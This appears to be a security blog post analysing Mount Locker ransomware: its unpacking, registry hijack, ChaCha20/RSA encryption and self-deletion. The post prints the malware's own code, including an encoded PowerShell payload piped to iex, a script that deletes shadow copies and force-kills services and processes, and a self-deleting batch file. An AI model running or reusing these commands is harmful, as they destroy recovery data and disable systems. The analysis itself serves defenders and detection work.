---
title: Mount Locker ransomware analysis
date: 2020-11-26
header: 
  teaser: "/assets/img/image-20201126104226634.png"
---

This blog post will explain how the ransomware called Mount Locker works. For encryption, Mount Locker uses Chacha20 to encrypt files and RSA-2048 to encrypt the encryption key. But before the encryption procedure runs, Mount Locker performs a few tasks that increase the effectiveness of the ransomware. The used [MITRE ATT&CK techniques](https://attack.mitre.org/techniques/enterprise/) are listed under the heading IOC's. Make sure you can detect a number of these techniques within your IT infrastructure. so that a possible attack can be stopped based on known indicators. Make sure you don't reboot a host encrypted by Mount Locker because the file `bootmgr` is also encrypted.

> A new ransomware operation named Mount Locker is underway stealing victims' files before encrypting and then demanding multi-million dollar ransoms.
>
> Starting around the end of July 2020, Mount Locker began breaching corporate networks and deploying their ransomware. - [https://www.bleepingcomputer.com/news/security/mount-locker-ransomware-joins-the-multi-million-dollar-ransom-game/](https://www.bleepingcomputer.com/news/security/mount-locker-ransomware-joins-the-multi-million-dollar-ransom-game/)

### Static analysis

**226A723FFB4A91D9950A8B266167C5B354AB0DB1DC225578494917FE53867EF2**

* Compiler/Linker: `Microsoft Visual Basic v5.0 - v6.0`
* Compiler timestamp: `0x5FAABCBE (Tue Nov 10 08:15:58 2020 UTC)`
* File extension: `.ReadManual.EF9E23B4`

**E7C277AAE66085F1E0C4789FE51CAC50E3EA86D79C8A242FFC066ED0B0548037**

* Compiler/Linker: `Microsoft Visual Basic v5.0/v6.0`
* Compiler timestamp: `0x5FB25E14 (Mon Nov 16 03:10:12 2020 UTC)`
* File extension: `.ReadManual.5A595725`

### Unpacking

Both files are packed with a packer written in Visual Basic. The packer checks if the process is being debugged using `IsDebuggerPresent` if not it continues to unpack the executable into a created segment. Using x64dbg and PE-bear I dumped the full executable from memory and modified the image base and section headers.

![image-20201123084816987]({{site.url}}/assets/img/image-20201123084816987.png)

![image-20201123085149316]({{site.url}}/assets/img/image-20201123085149316.png)

### Mutex

The serial number of the used drive is retrieved and used as mutex value. To make sure only one copy of the ransomware is running on the computer.

### Change Default File Association - [T1546.001](https://attack.mitre.org/techniques/T1546/001/), [T1112](https://attack.mitre.org/techniques/T1112/)

Every time an encrypted file is opened the recovery manual of the ransomware is also opened.

`SHRegSetUSValueW("Software\\Classes\\.5A595725\\shell\\Open\\command", 1, 1, "explorer.exe RecoveryManual.html", 40, 2)`

### Inhibit System Recovery - [T1490](https://attack.mitre.org/techniques/T1490/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1489](https://attack.mitre.org/techniques/T1489/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/), [T1106](https://attack.mitre.org/techniques/T1106/)

To run a Powershell script it will create a file in the temporary folder `C:\\Users\\IEUser\\AppData\\Local\\Temp\\<GetTickCount>.tmp` and write a Powershell script to the file shown belown.

```powershell
$data = [System.Convert]::FromBase64String("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")
$ms = New-Object System.IO.MemoryStream(, $data)
$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
$sr.ReadToEnd() | iex
```

The Powersehll script is then executed by calling `powershell.exe -windowstyle hidden -c $mypid='972'[System.IO.File]::ReadAllText('C:\\Users\\IEUser\\AppData\\Local\\Temp\\~1399171.tmp')|iex")`. Which results in the shadow copies being deleted and a list of services and processes being stopped. 

```powershell
Write-Host "DELETE RESTORY POINT`r`n" -nonewline
vssadmin.exe delete shadows /all /Quiet
Write-Host "QUERY SERVICE LIST`r`n" -nonewline
$List = Get-WmiObject -Query "SELECT ProcessId, Name, PathName FROM win32_service WHERE  ProcessId > 0 AND NOT (PathName LIKE '%:\\WINDOWS\\%')"
foreach ($Item in $List)
{
   Write-Host "KILL SERVICE $($Item.Name)`r`n" -nonewline
	Stop-Service -Force -ErrorAction SilentlyContinue -Name $Item.Name
}
$ExceptProcess = @("firefox.exe", "chrome.exe", "iexplore.exe", "tor.exe", "powershell.exe", "mfeatp.exe", "mfehcs.exe", "mfefire.exe", "mfeesp.exe", "macompatsvc.exe", "MarService.exe", "mfetp.exe", "mfevtps.exe","macmnsvc.exe", "masvc.exe", "mfemactl.exe", "epintegrationservice.exe", "bdredline.exe", "epprotectedservice.exe", "epsecurityservice.exe", "epupdateservice.exe", "epag.exe", "kavfswp.exe", "klnagent.exe", "vapm.exe", "kavfs.exe", "ServiceRequest.exe", "cptrayUI.exe", "ThreatLockerTray.exe", "WRSA.exe", "mbam.exe", "mbamtray.exe", "MBAMService.exe", "KeyPass.exe", "avgui.exe", "emet_agent.exe", "emet_service.exe", "firesvc.exe", "firetray.exe", "hipsvc.exe", "mfevtps.exe", "mcafeefire.exe", "scan32.exe", "shstat.exe", "tbmon.exe", "vstskmgr.exe", "engineserver.exe", "mfevtps.exe", "mfeann.exe", "mcscript.exe", "updaterui.exe", "udaterui.exe", "naprdmgr.exe", "frameworkservice.exe", "cleanup.exe", "cmdagent.exe", "frminst.exe", "mcscript_inuse.exe", "mctray.exe", "mcshield.exe", "AAWTray.exe", "Ad-Aware.exe", "MSASCui.exe", "_avp32.exe", "_avpcc.exe", "_avpm.exe", "aAvgApi.exe", "ackwin32.exe", "adaware.exe", "advxdwin.exe", "agentsvr.exe", "agentw.exe", "alertsvc.exe", "alevir.exe", "alogserv.exe", "amon9x.exe", "anti-trojan.exe", "antivirus.exe", "ants.exe", "apimonitor.exe", "aplica32.exe", "apvxdwin.exe", "arr.exe", "atcon.exe", "atguard.exe", "atro55en.exe", "atupdater.exe", "atwatch.exe", "au.exe", "aupdate.exe", "auto-protect.nav80try.exe", "autodown.exe", "autotrace.exe", "autoupdate.exe", "avconsol.exe", "ave32.exe", "avgcc32.exe", "avgctrl.exe", "avgemc.exe", "avgnt.exe", "avgrsx.exe", "avgserv.exe", "avgserv9.exe", "avguard.exe", "avgw.exe", "avkpop.exe", "avkserv.exe", "avkservice.exe", "avkwctl9.exe", "avltmain.exe", "avnt.exe", "avp.exe", "avp.exe", "avp32.exe", "avpcc.exe","avpdos32.exe", "avpm.exe", "avptc32.exe", "avpupd.exe", "avsched32.exe", "avsynmgr.exe", "avwin.exe", "avwin95.exe", "avwinnt.exe", "avwupd.exe", "avwupd32.exe", "avwupsrv.exe", "avxmonitor9x.exe", "avxmonitornt.exe", "avxquar.exe", "backweb.exe", "bargains.exe", "bd_professional.exe", "beagle.exe", "belt.exe", "bidef.exe", "bidserver.exe", "bipcp.exe", "bipcpevalsetup.exe", "bisp.exe", "blackd.exe", "blackice.exe", "blink.exe", "blss.exe", "bootconf.exe", "bootwarn.exe", "borg2.exe", "bpc.exe", "brasil.exe", "bs120.exe", "bundle.exe", "bvt.exe", "ccapp.exe", "ccevtmgr.exe", "ccpxysvc.exe", "ccsvchst.exe", "ccSvcHst.exe", "cdp.exe", "cfd.exe", "cfgwiz.exe", "cfiadmin.exe", "cfiaudit.exe", "cfinet.exe", "cfinet32.exe", "claw95.exe", "claw95cf.exe", "clean.exe", "cleaner.exe", "cleaner3.exe", "cleanpc.exe", "click.exe", "cmesys.exe", "cmgrdian.exe", "cmon016.exe", "connectionmonitor.exe", "cpd.exe", "cpf9x206.exe", "cpfnt206.exe", "ctrl.exe", "cv.exe", "cwnb181.exe", "cwntdwmo.exe", "datemanager.exe", "dcomx.exe", "defalert.exe", "defscangui.exe", "defwatch.exe", "deputy.exe", "divx.exe", "dllcache.exe", "dllreg.exe", "doors.exe", "dpf.exe", "dpfsetup.exe", "dpps2.exe", "drwatson.exe", "drweb32.exe", "drwebupw.exe", "dssagent.exe", "dvp95.exe", "dvp95_0.exe", "ecengine.exe", "efpeadm.exe", "EMET_Agent.exe", "EMET_Service.exe", "emsw.exe", "ent.exe", "esafe.exe", "escanhnt.exe", "escanv95.exe", "espwatch.exe", "ethereal.exe", "etrustcipe.exe", "evpn.exe", "exantivirus-cnet.exe", "exe.avxw.exe", "expert.exe", "explore.exe", "f-agnt95.exe", "f-prot.exe", "f-prot95.exe", "f-stopw.exe", "fameh32.exe", "fast.exe", "fch32.exe", "fih32.exe", "findviru.exe", "firewall.exe", "fnrb32.exe", "fp-win.exe", "fp-win_trial.exe", "fprot.exe", "frw.exe", "fsaa.exe", "fsav.exe", "fsav32.exe", "fsav530stbyb.exe", "fsav530wtbyb.exe", "fsav95.exe", "fsgk32.exe", "fsm32.exe", "fsma32.exe", "fsmb32.exe", "gator.exe", "gbmenu.exe", "gbpoll.exe", "generics.exe", "gmt.exe", "guard.exe", "guarddog.exe", "hacktracersetup.exe", "hbinst.exe", "hbsrv.exe", "hotactio.exe", "hotpatch.exe", "htlog.exe", "htpatch.exe", "hwpe.exe", "hxdl.exe", "hxiul.exe", "iamapp.exe", "iamserv.exe", "iamstats.exe", "ibmasn.exe", "ibmavsp.exe", "icload95.exe", "icloadnt.exe", "icmon.exe", "icsupp95.exe", "icsuppnt.exe", "idle.exe", "iedll.exe", "iedriver.exe", "iface.exe", "ifw2000.exe", "inetlnfo.exe", "infus.exe", "infwin.exe", "init.exe", "intdel.exe", "intren.exe", "iomon98.exe", "istsvc.exe", "jammer.exe", "jdbgmrg.exe", "jedi.exe", "kavlite40eng.exe", "kavpers40eng.exe", "kavpf.exe", "kazza.exe", "keenvalue.exe", "kerio-pf-213-en-win.exe", "kerio-wrl-421-en-win.exe", "kerio-wrp-421-en-win.exe", "kernel32.exe", "killprocesssetup161.exe", "launcher.exe", "ldnetmon.exe", "ldpro.exe", "ldpromenu.exe", "ldscan.exe", "lnetinfo.exe", "loader.exe", "localnet.exe", "LockAppHost.exe", "LockApp.exe", "lockdown.exe", "lockdown2000.exe", "lookout.exe", "lordpe.exe", "lsetup.exe", "luall.exe", "luau.exe", "lucomserver.exe", "luinit.exe", "luspt.exe", "mapisvc32.exe", "mcagent.exe", "mcmnhdlr.exe", "mcshield.exe", "mctool.exe", "mcupdate.exe", "mcvsrte.exe", "mcvsshld.exe", "md.exe", "mfin32.exe", "mfw2en.exe", "mfweng3.02d30.exe", "mgavrtcl.exe", "mgavrte.exe", "mghtml.exe", "mgui.exe", "minilog.exe", "mmod.exe", "monitor.exe", "moolive.exe", "mostat.exe", "mpfagent.exe", "mpfservice.exe", "mpftray.exe", "mrflux.exe", "msapp.exe", "msbb.exe", "msblast.exe", "mscache.exe", "msccn32.exe", "mscman.exe", "msconfig.exe", "msdm.exe", "msdos.exe", "msiexec16.exe", "msinfo32.exe", "mslaugh.exe", "msmgt.exe", "msmsgri32.exe", "mssmmc32.exe", "mssys.exe", "msvxd.exe", "mu0311ad.exe", "mwatch.exe", "n32scanw.exe", "nav.exe", "navap.navapsvc.exe", "navapsvc.exe", "navapw32.exe", "navdx.exe", "navlu32.exe", "navnt.exe", "navstub.exe", "navw32.exe", "navwnt.exe", "nc2000.exe", "ncinst4.exe", "ndd32.exe", "neomonitor.exe", "neowatchlog.exe", "netarmor.exe", "netd32.exe", "netinfo.exe", "netmon.exe", "netscanpro.exe", "netspyhunter-1.2.exe", "netstat.exe", "netutils.exe", "nisserv.exe", "nisum.exe", "nmain.exe", "nod32.exe", "normist.exe", "norton_internet_secu_3.0_407.exe", "notstart.exe", "npf40_tw_98_nt_me_2k.exe", "npfmessenger.exe", "nprotect.exe", "npscheck.exe", "npssvc.exe", "nsched32.exe", "nssys32.exe", "nstask32.exe", "nsupdate.exe", "nt.exe", "ntrtscan.exe", "ntvdm.exe", "ntxconfig.exe", "nui.exe", "nupgrade.exe", "nvarch16.exe", "nvc95.exe", "nvsvc32.exe", "nwinst4.exe", "nwservice.exe", "nwtool16.exe", "ollydbg.exe", "onsrvr.exe", "optimize.exe", "ostronet.exe", "otfix.exe", "outpost.exe", "outpostinstall.exe", "outpostproinstall.exe", "padmin.exe", "panixk.exe", "patch.exe", "pavcl.exe", "pavproxy.exe", "pavsched.exe", "pavw.exe", "pccwin98.exe", "pcfwallicon.exe","pcip10117_0.exe", "pcscan.exe", "pdsetup.exe", "periscope.exe", "persfw.exe", "perswf.exe", "pf2.exe", "pfwadmin.exe", "pgmonitr.exe", "pingscan.exe", "platin.exe", "pop3trap.exe", "poproxy.exe", "popscan.exe", "portdetective.exe", "portmonitor.exe", "powerscan.exe", "ppinupdt.exe", "pptbc.exe", "ppvstop.exe", "prizesurfer.exe", "prmt.exe", "prmvr.exe", "procdump.exe", "processmonitor.exe", "procexplorerv1.0.exe", "programauditor.exe", "proport.exe", "protectx.exe", "pspf.exe", "purge.exe", "qconsole.exe", "qserver.exe", "rapapp.exe", "rav7.exe", "rav7win.exe", "rav8win32eng.exe", "ray.exe", "rb32.exe", "rcsync.exe", "realmon.exe", "reged.exe", "regedit.exe", "regedt32.exe", "rescue.exe", "rescue32.exe", "rrguard.exe", "rshell.exe", "rtvscan.exe", "rtvscn95.exe", "rulaunch.exe", "run32dll.exe", "rundll.exe", "rundll16.exe", "ruxdll32.exe", "safeweb.exe", "sahagent.exescan32.exe", "shstat.exe", "tbmon.exe", "vstskmgr.exe", "engineserver.exe", "mfevtps.exe", "mfeann.exe", "mcscript.exe", "updaterui.exe", "udaterui.exe", "naprdmgr.exe", "frameworkservice.exe","cleanup.exe", "cmdagent.exe", "frminst.exe", "mcscript_inuse.exe", "mctray.exe", "mcshield.exe", "save.exe", "savenow.exe", "sbserv.exe", "sc.exe", "scam32.exe", "scan32.exe", "scan95.exe", "scanpm.exe", "scrscan.exe", "serv95.exe", "setup_flowprotector_us.exe", "setupvameeval.exe", "sfc.exe", "sgssfw32.exe", "sh.exe", "shellspyinstall.exe", "shn.exe", "showbehind.exe", "smc.exe", "Smc.exe", "SmcGui.exe", "sms.exe", "smss32.exe", "SymCorpUI.exe", "soap.exe", "sofi.exe", "sperm.exe", "spf.exe", "sphinx.exe", "spoler.exe", "spoolcv.exe", "spoolsv32.exe", "spyxx.exe", "srexe.exe", "srng.exe", "ss3edit.exe", "ssg_4104.exe", "ssgrate.exe", "st2.exe", "start.exe", "stcloader.exe", "supftrl.exe", "support.exe", "supporter5.exe", "svchostc.exe", "svchosts.exe", "sweep95.exe", "sweepnet.sweepsrv.sys.swnetsup.exe", "symproxysvc.exe", "symtray.exe", "sysedit.exe", "sysupd.exe", "taskmg.exe", "taskmo.exe", "taumon.exe", "tbscan.exe", "tc.exe", "tca.exe", "tcm.exe", "tds-3.exe", "tds2-98.exe", "tds2-nt.exe", "teekids.exe", "tfak.exe", "tfak5.exe", "tgbob.exe", "titanin.exe", "titaninxp.exe", "tracert.exe", "trickler.exe", "trjscan.exe", "trjsetup.exe", "trojantrap3.exe", "tsadbot.exe", "tvmd.exe", "tvtmd.exe", "undoboot.exe", "updat.exe", "update.exe", "upgrad.exe", "utpost.exe", "vbcmserv.exe", "vbcons.exe", "vbust.exe", "vbwin9x.exe", "vbwinntw.exe", "vcsetup.exe", "vet32.exe", "vet95.exe", "vettray.exe", "vfsetup.exe", "vir-help.exe", "virusmdpersonalfirewall.exe", "vnlan300.exe", "vnpc3000.exe", "vpc32.exe", "vpc42.exe", "vpfw30s.exe", "vptray.exe", "vscan40.exe", "vscenu6.02d30.exe", "vsched.exe", "vsecomr.exe", "vshwin32.exe", "vsisetup.exe", "vsmain.exe", "vsmon.exe", "vsstat.exe", "vswin9xe.exe", "vswinntse.exe", "vswinperse.exe", "w32dsm89.exe", "w9x.exe", "watchdog.exe", "webdav.exe", "webscanx.exe", "webtrap.exe", "wfindv32.exe", "whoswatchingme.exe", "wimmun32.exe", "win-bugsfix.exe", "win32.exe", "win32us.exe", "winactive.exe", "window.exe", "windows.exe", "wininetd.exe", "wininitx.exe", "winlogin.exe", "winmain.exe", "winnet.exe", "winppr32.exe", "winrecon.exe", "winservn.exe", "winssk32.exe", "winstart.exe", "winstart001.exe", "wintsk32.exe", "winupdate.exe", "wkufind.exe", "wnad.exe", "wnt.exe", "wradmin.exe", "wrctrl.exe", "wsbgate.exe", "wupdater.exe", "wupdt.exe", "wyvernworksfirewall.exe", "xpf202en.exe", "zapro.exe", "zapsetup3001.exe", "zatutor.exe", "zonalm2601.exe", "zonealarm.exe")
Write-Host "QUERY PROCESS LIST`r`n" -nonewline
$List = Get-WmiObject -Query "SELECT ProcessId, Name, ExecutablePath FROM win32_process WHERE  ProcessId > 0 AND NOT (ExecutablePath LIKE '%:\\WINDOWS\\%')"
if ($List -ne $null)
{
	foreach ($Item in $List)
	{
		if ($ExceptProcess -notcontains $Item.Name -AND $Item.ProcessId -ne $mypid)
		{
			Write-Host "KILL PROCESS PID=$($Item.ProcessId) NAME=$($Item.ExecutablePath)`r`n" -nonewline
			Stop-Process -Force -Id $Item.ProcessId -ErrorAction SilentlyContinue
		}
		else
		{
			Write-Host "SKIP PROCESS PID=$($Item.ProcessId) NAME=$($Item.ExecutablePath)`r`n" -nonewline
		}
	}
```

### Encryption - [T1486](https://attack.mitre.org/techniques/T1486/)

Using the API calls `CryptAcquireContextW, CryptImportKey, CryptEncrypt` an embedded RSA-2048 key is imported and used to encrypt 32 bytes generated by the instruction `rdtsc`. The plaintext and ciphertext of the bytes will later be used to encrypt other values. To make it easy, we call those `32_bytes`  and `encrypted_32_bytes`.

![image-20201126183728608]({{site.url}}/assets/img/image-20201126183728608.png)

![image-20201126103212463]({{site.url}}/assets/img/image-20201126103212463.png)

The ransomware will search for all types of drives and it skips the following file extensions and directories.

`.exe, .dll, .sys, .msi, .mui, .inf, .cat, .bat, .cmd, .ps1, .vbs, .ttf, .fon., .lnk`

`Windows, System Volume Information, $RECYCLE.BIN, SYSTEM.SAV, WINNT, $WINDOWS.~BT, Windows.old, PerfLog, WindowsApps, Microsoft\Windows, Roaming\Microsoft, Local\Microsoft, LocalLow\Microsoft, ProgramData\Microsoft, Local\Packages, ProgramData\Packages, Windows Defender, microsoft shared, Google\Chrome, Mozilla Firefox, Mozilla\Firefox, Internet Explorer, MicrosoftEdge, Tor Browser, AppData\Local\Temp` 

Using `CreateFileW` and `CreateFileMappingW` it creates a filehandle and a handle to the file in memory. Instead of using `MoveFileW` to change the file name, it uses the `SetFileInformationByHandle `  to change the extension of the file.

![image-20201125090409246]({{site.url}}/assets/img/image-20201125090409246.png)

As seen earlier in the executable it again generates 32 bytes using `rdtsc`, this is done for every file. Let's call those bytes `file_32_bytes`.

![image-20201126132521173]({{site.url}}/assets/img/image-20201126132521173.png)

So we have the following values.

```
32_bytes - will be used as key and nonce with ChaCha20
encrypted__32_bytes - encrypted with RSA and will be added to the file
file_32_bytes - will be used as key and nonce with ChaCha20
```

The [Chacha20](https://en.wikipedia.org/wiki/Salsa20#ChaCha_variant) implementation used by the ransomware is very similar to an implementation found on [Github](https://github.com/Ginurx/chacha20-c). Using Chacha20  `file_32_bytes` will be encrypted with `32_bytes` as key and the first 12 bytes of `32_bytes` as the nonce. Let's call the ciphertext `encrypted_32_bytes`. Then it writes  `file_encrypted_32_bytes`  and `encrypted_32_bytes`  to the end of the file that will be encrypted.

Using `MapViewOfFile` the file is mapped in memory with as length the files size or `0x4000000` bytes. This buffer will then be encrypted with Chacha20 using `file_32_bytes` as key and the first 12 bytes of `file_32_bytes` as the nonce. After the buffer is encrypted it calls `MapViewOfFile` to store the buffer to the file on disk.

![image-20201126164526733]({{site.url}}/assets/img/image-20201126164526733.png)

The encryption procedure is described in the diagram below.

![image-20201126204733514]({{site.url}}/assets/img/image-20201126204733514.png)

### Don't reboot

The ransomware doesn't whitelist the file `bootmgr` in the encryption procedure so rebooting the host causes problems.

![image-20201126201531446]({{site.url}}/assets/img/image-20201126201531446.png)

![image-20201126191524442]({{site.url}}/assets/img/image-20201126191524442.png)

### File deletion - [T1070.004](https://attack.mitre.org/techniques/T1070/004/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1106](https://attack.mitre.org/techniques/T1106/)


After the files are encrypted the ransomware will delete itself.

```cmd
cmd /c "C:\Users\Admin\AppData\Local\Temp\\0F7568A2.bat" "C:\Users\Admin\AppData\Local\Temp\226a723ffb4a91d9950a8b266167c5b354ab0db1dc225578494917fe53867ef2.exe"
```
The content of the`<GetTickCount>.bat` file.

```cmd
attrib -s -r -h %1
:l
del /F /Q %1
if exist %1 goto l
del %0 
```

### Debugging mode

The ransomware includes a debugging mode that logs almost every operation to a console or file if the mode is enabled. Below are some of those strings.

```
[OK] locker.check.dbl_run > ok
[OK] locker > finished\r\n
[INFO] locker > start init script
```

### Ransom Note

The ransomware drops a ransom note in every folder that it encrypts with the name `RecoveryManual.html`. This note includes a ClientId which can be used to contact the threat actor on their own "support" portal. This ClientId is based on the computer name XOR'ed by a hardcoded value. I think threat actors use the ClientId to determine which computer belongs to which campaign.

![image-20201126104226634]({{site.url}}/assets/img/image-20201126104226634.png)

### IOC's

**Mitre ATT&CK techniques**

[T1546.001](https://attack.mitre.org/techniques/T1546/001/)

